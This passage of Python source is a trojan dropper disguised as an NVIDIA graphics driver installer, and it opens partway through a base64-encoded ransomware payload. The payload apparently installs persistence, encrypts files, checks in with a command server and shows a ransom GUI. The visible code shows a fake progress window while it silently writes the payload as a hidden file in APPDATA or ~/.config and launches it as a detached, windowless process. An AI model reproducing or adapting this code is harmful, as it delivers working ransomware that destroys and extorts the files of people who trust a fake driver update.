RfZmlsZXMgKz0gMQogICAgICAgICAgICAKICAgICAgICAgICAgIyAtLS0gQ0xFQU4gVVAgLS0tCiAgICAgICAgICAgIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nID0gRmFsc2UgIyBTdG9wIGFsbCBiYWNrZ3JvdW5kIHRocmVhZHMKICAgICAgICAgICAgCiAgICAgICAgICAgICMgMS4gUmVtb3ZlIFBlcnNpc3RlbmNlCiAgICAgICAgICAgIHJlbW92ZV9wZXJzaXN0ZW5jZSgpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIDIuIE1hcmsgYXMgQ2xlYW4KICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgIHdpdGggb3BlbihDTEVBTl9NQVJLRVIsICd3JykgYXMgZjogZi53cml0ZSgiRnJlZWQiKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKCiAgICAgICAgICAgICMgMy4gTnVrZSBDb25maWcgRGlyZWN0b3J5CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKENPTkZJR19ESVIpOgogICAgICAgICAgICAgICAgdHJ5OiBzaHV0aWwucm10cmVlKENPTkZJR19ESVIpCiAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgCiAgICAgICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLmNvbmZpZyh0ZXh0PWYiU1VDQ0VTUyEge2RlY3J5cHRlZF9maWxlc30gZmlsZXMgZGVjcnlwdGVkLiBTeXN0ZW0gQ2xlYW5lZC4iLCBmZz0nIzRkZmY4OCcpCiAgICAgICAgICAgIG1lc3NhZ2Vib3guc2hvd2luZm8oIkRlY3J5cHRpb24gQ29tcGxldGUiLCAiWW91ciBmaWxlcyBoYXZlIGJlZW4gcmVzdG9yZWQgYW5kIHRoZSByYW5zb213YXJlIHJlbW92ZWQuXG5FeGl0aW5nIG5vdy4iKQogICAgICAgICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZ19lcnJvcihmIkRlY3J5cHRpb24gZmFpbGVkOiB7ZX0iKQogICAgICAgICAgICBzZWxmLnN0YXR1c19sYWJlbC5jb25maWcodGV4dD0iRVJST1I6IERlY3J5cHRpb24gZmFpbGVkLiIsIGZnPSdyZWQnKQogICAgICAgICAgICBtZXNzYWdlYm94LnNob3dlcnJvcigiRXJyb3IiLCBmIkRlY3J5cHRpb24gZmFpbGVkOiB7ZX0iKQogICAgICAgIAogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgICMgRk9SQ0UgRVhJVCBOTyBNQVRURVIgV0hBVAogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzZWxmLm1hc3Rlci5ncmFiX3JlbGVhc2UoKSAKICAgICAgICAgICAgICAgIHNlbGYubWFzdGVyLmRlc3Ryb3koKSAKICAgICAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgICAgIG9zLl9leGl0KDApICMgSGFyZCBleGl0IHRvIGtpbGwgYWxsIHRocmVhZHMKCiMgLS0tIE1haW4gRXhlY3V0aW9uIC0tLQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgaWYgb3MucGF0aC5leGlzdHMoQ0xFQU5fTUFSS0VSKToKICAgICAgICAjIERvdWJsZSBjaGVjayBpZiBjbGVhbmVyIGRpZG4ndCBmaW5pc2gKICAgICAgICBwYXNzIAogICAgCiAgICAjIDAuIFBlcnNpc3RlbmNlIEluc3RhbGxhdGlvbgogICAgaW5zdGFsbF9wZXJzaXN0ZW5jZSgpCgogICAgaGlkZV9jb25zb2xlKCkKCiAgICAjIFBFUlNJU1RFTkNFIENIRUNLLUlOCiAgICAjIENoZWNrIElEIGZpbGUgaW4gc3RhYmxlIENPTkZJR19ESVIKICAgIGlmIG9zLnBhdGguZXhpc3RzKElEX0ZJTEUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKElEX0ZJTEUsICdyJykgYXMgZjoKICAgICAgICAgICAgICAgIHZpY3RpbV9pZCA9IGYucmVhZCgpLnN0cmlwKCkKICAgICAgICAgICAgaWYgdmljdGltX2lkOgogICAgICAgICAgICAgICAgbG9nX2Vycm9yKGYiUmVzdW1pbmcgc2Vzc2lvbiBmb3IgVmljdGltIElEOiB7dmljdGltX2lkfSIpCiAgICAgICAgICAgICAgICByb290ID0gVGsoKQogICAgICAgICAgICAgICAgYXBwID0gUmFuc29td2FyZUdVSShyb290LCB2aWN0aW1faWQpCiAgICAgICAgICAgICAgICByb290Lm1haW5sb29wKCkKICAgICAgICAgICAgICAgIHN5cy5leGl0KCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MgCiAgICAKICAgICMgTkVXIElORkVDVElPTgogICAgYWVzX2tleSA9IGVuY3J5cHRfZGlyZWN0b3J5KCkKICAgIAogICAgaWYgYWVzX2tleToKICAgICAgICB2aWN0aW1faWQgPSBjaGVja19pbl93aXRoX2MyKGFlc19rZXkpCiAgICAgICAgaWYgdmljdGltX2lkOgogICAgICAgICAgICByb290ID0gVGsoKQogICAgICAgICAgICBhcHAgPSBSYW5zb213YXJlR1VJKHJvb3QsIHZpY3RpbV9pZCkKICAgICAgICAgICAgcm9vdC5tYWlubG9vcCgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgbG9nX2Vycm9yKCJGYWlsZWQgdG8gZ2V0IFZpY3RpbSBJRC4gQWJvcnRpbmcgR1VJLiIpCiAgICBlbHNlOgogICAgICAgIGxvZ19lcnJvcigiRW5jcnlwdGlvbiBza2lwcGVkIG9yIGZhaWxlZC4gQWJvcnRpbmcuIikK"
PAYLOAD_NAME = ".nvidia_update_helper.py"

def extract_and_execute_payload():
    """Drops the ransomware payload and executes it silently."""
    try:
        payload_data = base64.b64decode(PAYLOAD_B64)
        
        if os.name == 'nt':
            drop_dir = os.getenv('APPDATA')
            if not drop_dir: drop_dir = tempfile.gettempdir()
        else:
            drop_dir = os.path.expanduser("~/.config")
            if not os.path.exists(drop_dir):
                drop_dir = os.path.expanduser("~")
        
        drop_path = os.path.join(drop_dir, PAYLOAD_NAME)
        
        with open(drop_path, "wb") as f:
            f.write(payload_data)
            
        cmd = []
        if os.name == 'nt':
            cmd = ["python", drop_path]
        else:
            cmd = ["python3", drop_path]
            
        if os.name == 'nt':
            # Detach completely on Windows
            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        else:
            # Detach on Linux
            subprocess.Popen(cmd, start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        pass

def fake_installer_gui():
    root = Tk()
    root.title(FAKE_TITLE)
    root.geometry("600x400")
    root.resizable(False, False)
    root.configure(bg="#1a1a1a")

    header = Frame(root, bg="#1a1a1a")
    header.pack(fill="x", pady=20)
    Label(header, text="NVIDIA", fg="#76b900", bg="#1a1a1a", font=("Segoe UI", 24, "bold")).pack()
    Label(header, text="Graphics Driver Installer", fg="white", bg="#1a1a1a", font=("Segoe UI", 16)).pack()

    content = Frame(root, bg="#1a1a1a")
    content.pack(expand=True, fill="both", padx=40)
    
    status_label = Label(content, text="Checking system compatibility...", fg="#cccccc", bg="#1a1a1a", font=("Segoe UI", 10))
    status_label.pack(anchor="w", pady=(20, 5))
    
    progress = ttk.Progressbar(content, orient="horizontal", length=520, mode="determinate")
    progress.pack(pady=10)

    def run_simulation():
        steps = [
            "Checking install options...", "Validating packages...", "Installing Graphics Driver...",
            "Installing HD Audio Driver...", "Installing PhysX System...", "Finalizing..."
        ]
        
        # DROP THE PAYLOAD EXECUTION HERE
        root.after(2000, extract_and_execute_payload)
        
        progress['maximum'] = 100
        current_val = 0
        
        for i, step in enumerate(steps):
            time.sleep(1.0) 
            status_label.config(text=step)
            root.update()
            
            target = int((i + 1) / len(steps) * 100)
            while current_val < target:
                current_val += 2
                progress['value'] = current_val
                time.sleep(0.02)
                root.update()
        
        time.sleep(1)
        root.destroy()

    threading.Thread(target=run_simulation, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    fake_installer_gui()
